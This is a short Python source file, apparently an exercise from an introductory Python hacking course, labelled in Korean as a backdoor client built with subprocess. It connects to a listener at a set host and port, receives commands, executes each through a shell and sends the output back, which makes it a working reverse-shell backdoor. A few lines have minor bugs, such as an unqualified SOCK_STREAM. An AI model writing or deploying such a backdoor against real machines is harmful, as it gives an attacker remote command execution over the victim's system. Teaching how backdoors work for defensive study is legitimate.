'''
	python ==> 파이썬해킹입문, backdoor Client를 subprocess를 활용해 작성한 예제 코드
'''
import socket
import subprocess

HOST = '127.0.0.1'
PORT = 11443

s = socket.socket(socket.AF_INET, SOCK_STREAM, 0, 0)
s.connect((HOST,PORT))
s.send('[*] connection established!')

while 1:
	data = s.recv(1024)
	if data == "quit":
		break

	proc = subprocess.Popen(data, shell =True, stdout=subprocess.PIPE, 
			stderr = subprocess.PIPE, stdin = subprocess.PIPE)

	stdout_value = proc.stdout.read() + proc.stderr.read()
	s.send(stdout_value)

s.close()

	









